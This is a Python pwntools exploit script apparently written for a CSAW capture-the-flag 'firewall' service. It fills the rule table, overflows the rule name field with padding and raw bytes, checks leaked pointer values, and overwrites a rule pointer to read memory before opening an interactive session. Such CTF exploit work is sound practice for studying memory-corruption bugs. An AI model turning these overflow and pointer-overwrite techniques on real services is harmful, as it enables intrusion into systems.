#!/usr/bin/env python

from pwn import *
from time import sleep
# nc firewall.chal.csaw.io 4141

with open('payload', 'w') as f:
	f.write('')


def send(conn, line):
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)
	conn.send(line)


def add_firewall_rule(conn, fname="lol", fport="1234", ftype="TCP"):

	send(conn, "1")
	print conn.recvuntil("ENTER RULE NAME:")
	send(conn, fname)
	print conn.recvuntil("ENTER RULE PORT:")
	send(conn, fport)
	print conn.recvuntil("ENTER RULE TYPE:")
	send(conn, ftype)
	print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return


def edit_firewall_rule(conn, num="16", fname="lol", fport="1234", ftype="TCP"):

	send(conn, "2")
	print conn.recvuntil("ENTER RULE NUMBER TO EDIT:")
	send(conn, num)
	print conn.recvuntil("ENTER RULE NAME:")
	send(conn, fname)
	print conn.recvuntil("ENTER RULE PORT:")
	send(conn, fport)
	print conn.recvuntil("ENTER RULE TYPE:")
	send(conn, ftype)

	print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return


def chunks(l, n):
	"""return a list of successive n-sized chunks from l."""
	arr = []
	for i in range(0, len(l), n):
		arr.append(l[i:i+n])
	return arr

def read_firewall_rule(conn, num="16"):

	dat = ""

	send(conn, "4")
	print conn.recvuntil("ENTER RULE NUMBER TO PRINT:")
	send(conn, num)
	print conn.recvuntil("| - Name:")
	fname = conn.recvuntil("\n")[1:]
	print conn.recvuntil("| - Port:")
	fport = conn.recvuntil("\n")[1:]
	print conn.recvuntil("| - Type:")
	ftype = conn.recvuntil("\n")[1:]

	if fname.encode('hex') != "f1260168f1260184f12601a0f12601bcf12601d8f12601f4f12601016e616d65310a":
		print "LEAK IS DIFFERENT!!!"

	if fport.encode('hex') != "3239340a":
		print "LEAK IS DIFFERENT!!!"

	if ftype.encode('hex') != "f4f12601016e616d65310a":
		print "LEAK IS DIFFERENT!!!"


	print [x.encode('hex') for x in chunks(fname,4)]
	print [x.encode('hex') for x in chunks(fport,4)]
	print [x.encode('hex') for x in chunks(ftype,4)]

	print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return fname, fport, ftype

# windows_is_hard_and_i_am_a_big_baby
def delete_firewall_rule(conn, num="16"):


	send(conn, "3")
	print conn.recvuntil("| ENTER RULE NUMBER TO DELETE:")
	send(conn, num)

	print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return 

# while True:
# 	try:
def gogo():
	conn = remote('firewall.chal.csaw.io', 4141)
	# conn.recvuntil("FIREWALL CONTROL PANEL")
	send(conn, "352762356")
	for x in range(16):
		print "[!] "
		add_firewall_rule(conn, fname="RULE " + str(x))

	# edit_firewall_rule(conn, num="16", fname='A'*27 + '\xDE\xCA\xFA',ftype='\xDE\xCA\xFA')

	edit_firewall_rule(conn, num="16", fname='A'*28 + '\x42\x42',ftype='5678')
	return conn
def start():
	conn = remote('firewall.chal.csaw.io', 4141)
	conn.recvuntil("FIREWALL CONTROL PANEL")
	send(conn, "352762356")
	return conn


conn = start()
add_firewall_rule(conn, fname="name1")
add_firewall_rule(conn, fname="name2")
# delete_firewall_rule(conn, num="0")
# offset_to_flag = 457
# offset_to_flag = 0
# edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0x0126f1f4+offset_to_flag))##f4f12601
edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0x0041281c))##f4f12601

conn.interactive()
